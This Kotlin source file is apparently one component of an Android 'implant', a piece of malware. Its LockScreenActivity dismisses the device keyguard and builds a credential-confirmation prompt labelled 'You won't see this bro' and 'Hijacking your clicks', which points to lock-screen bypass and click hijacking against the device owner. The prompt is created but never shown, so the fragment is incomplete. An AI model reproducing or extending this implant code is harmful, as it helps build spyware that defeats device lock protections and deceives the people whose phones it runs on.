package com.cooperthecoder.implant

import android.app.KeyguardManager
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import android.util.Log
import android.view.WindowManager

class LockScreenActivity : AppCompatActivity() {

    companion object {
        val TAG: String = LockScreenActivity::class.java.name
    }

    private val keyguardManager by lazy {
        getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)
        Log.d(TAG, "In LockScreenActivity")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            keyguardManager.createConfirmDeviceCredentialIntent(
                    "You won't see this bro",
                    "Hijacking your clicks"
            )
            Log.d(TAG, "Bringing up lockscreen")
        } else {
            // TODO: Find a way of doing this pre-Lollipop
            Log.d(TAG, "Bringing up lockscreen not possible pre-Lollipop")
        }
    }
}
